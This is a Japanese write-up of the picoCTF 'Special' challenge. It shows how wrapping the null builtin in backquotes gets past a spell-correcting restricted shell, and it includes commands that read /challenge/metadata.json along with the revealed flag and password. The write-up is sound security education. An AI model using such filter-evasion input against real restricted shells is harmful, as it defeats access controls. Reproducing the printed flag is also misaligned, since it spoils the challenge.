#CTF #Linux #Shell

# Special Writeup

## 概要

本問題は、picoCTFの「Special」というチャレンジであり、入力された英単語を裏側で**自動的にスペル補正・正規化**するカスタムシェル（Special.py）を回避してフラグを取得する問題である。

## 環境挙動の観察

* 通常のコマンド（例: `ls`, `cat`, `set`）を入力すると、入力が人間向けの英単語に置換され、システムコマンドとして実行されない。

```
Special$ ls
Is
sh: 1: Is: not found

Special$ cat
Cat
sh: 1: Cat: not found
```

* バッククォート（`` `...` ``）や特殊文字を含む入力でも同様に変換が入るが、ある条件下で回避できることが確認できる。

## 回避手法

* 有効だった入力例：

```
Special$ `:`ls /
`:`ls /
# -> / の内容が表示される

Special$ `:`cat /challenge/metadata.json
`:`cat /challenge/metadata.json
# -> ファイル内容が表示される
```

* ポイントは `:`（コロン）を先頭に置き、かつバッククォートで囲む点である。

## 技術的考察（なぜ有効か）

1. [[null_command]]は POSIX シェルの**ビルトイン（組み込み）コマンド**であり、何もしない（常に成功を返す）コマンドとして定義されている。従って、Special.py 側の「単語置換ロジック」が `:` を修正対象外と扱う可能性が高い。

2. バッククォートはシェルでコマンド置換を行うため、Special.py が入出力文字列を修正する前に、バッククォートの中身がシステムシェル（`/bin/sh` 等）で解釈・実行されることで、補正を回避できる。

3. 実装上は、Special.py が先頭単語または先頭にあるアルファベット文字列のみを補正対象にしており、`:` のような記号を先頭に置くことで補正の適用範囲外にする工夫が働いていると推測される。

## フラグ取得例

```
Special$ `:`cat /challenge/metadata.json
`:`cat /challenge/metadata.json
{"flag": "picoCTF{5p311ch3ck_15_7h3_w0r57_b741d1b1}", "password": "483e80d4"}
```

* 取得したフラグ: `picoCTF{5p311ch3ck_15_7h3_w0r57_b741d1b1}`

## まとめと教訓

* 入力正規化（スペル補正）を行うインターフェースは、意図せぬ正規化漏れや正規化前後の不一致を突かれると脆弱性となり得る。
* シェルやWebアプリケーション設計においては、ユーザー入力の正規化ルールを明確化し、修正の影響範囲を最小化することが重要である。

---
